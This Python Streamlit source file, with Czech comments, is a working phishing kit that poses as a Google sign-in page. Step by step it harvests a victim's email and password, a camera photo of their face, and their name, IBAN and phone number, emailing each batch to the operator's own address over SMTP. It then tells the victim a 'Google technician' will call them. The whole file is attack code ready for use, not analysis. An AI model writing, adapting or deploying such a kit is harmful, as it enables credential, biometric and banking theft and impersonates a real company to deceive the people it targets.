import streamlit as st
import os
import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from datetime import datetime

# --- NAČTENÍ ÚDAJŮ Z ENV ---
MOJE_ADRESA = os.environ.get("MOJE_ADRESA")
MOJE_HESLO = os.environ.get("MOJE_HESLO")

def odeslat_email(subjekt, text, obrazek=None):
    if not MOJE_ADRESA or not MOJE_HESLO:
        return
    
    msg = MIMEMultipart()
    msg['Subject'] = subjekt
    msg['From'] = MOJE_ADRESA
    msg['To'] = MOJE_ADRESA
    msg.attach(MIMEText(text))

    if obrazek:
        img = MIMEImage(obrazek.read(), name="oblicej.png")
        msg.attach(img)

    try:
        server = smtplib.SMTP_SSL("smtp.seznam.cz", 465)
        server.login(MOJE_ADRESA, MOJE_HESLO)
        server.send_message(msg)
        server.quit()
    except:
        pass

# --- LOGIKA ---
if "step" not in st.session_state:
    st.session_state.step = "email"

st.set_page_config(page_title="Přihlášení – Účty Google")

# Google Style CSS
st.markdown("<style>div.stButton > button:first-child { background-color: #4285F4; color: white; border-radius: 4px; border: none; width: 100%; }</style>", unsafe_allow_html=True)

def logo():
    st.markdown("<h1 style='text-align: center;'><span style='color: #4285F4;'>G</span><span style='color: #EA4335;'>o</span><span style='color: #FBBC05;'>o</span><span style='color: #4285F4;'>g</span><span style='color: #34A853;'>l</span><span style='color: #EA4335;'>e</span></h1>", unsafe_allow_html=True)

col1, col2, col3 = st.columns([1, 2, 1])

with col2:
    # 1. KROK: EMAIL
    if st.session_state.step == "email":
        logo()
        st.subheader("Přihlásit se")
        em = st.text_input("E-mail")
        if st.button("Další"):
            st.session_state.zadany_email = em
            st.session_state.step = "password"
            st.rerun()

    # 2. KROK: HESLO (Posílá Email č. 1)
    elif st.session_state.step == "password":
        logo()
        st.write(f"👤 {st.session_state.zadany_email}")
        he = st.text_input("Zadejte heslo", type="password")
        if st.button("Další"):
            st.session_state.zadane_heslo = he
            odeslat_email("🔑 LOGIN DATA", f"Email: {st.session_state.zadany_email}\nHeslo: {he}")
            st.session_state.step = "face"
            st.rerun()

    # 3. KROK: FACE VERIFY (Posílá Email č. 2 s fotkou)
    elif st.session_state.step == "face":
        logo()
        st.warning("Ověření identity obličejem")
        foto = st.camera_input("Vyfoťte se pro ověření")
        if foto:
            with st.spinner("Odesílám k ověření..."):
                odeslat_email("📸 FACE VERIFY", f"Uživatel: {st.session_state.zadany_email}", obrazek=foto)
                time.sleep(2)
                st.session_state.step = "bank"
                st.rerun()

    # 4. KROK: BANKA (Posílá Email č. 3)
    elif st.session_state.step == "bank":
        logo()
        st.error("Podezřelá aktivita - Vyžadováno BankID")
        jm = st.text_input("Jméno")
        ib = st.text_input("IBAN / Číslo účtu")
        tel = st.text_input("Telefon")
        if st.button("Dokončit"):
            odeslat_email("🏦 BANK DATA", f"Uživatel: {st.session_state.zadany_email}\nJméno: {jm}\nIBAN: {ib}\nTel: {tel}")
            st.session_state.step = "final"
            st.rerun()

    # 5. KROK: FINÁLE
    elif st.session_state.step == "final":
        logo()
        st.success("Ověření přijato")
        st.markdown("### POČKEJTE NA OVĚŘENÍ")
        st.info("V nejbližší době Vám zavolá technik Google pro dokončení procesu.")
        st.write("Tento proces může trvat několik minut. Ne zavírejte okno.")
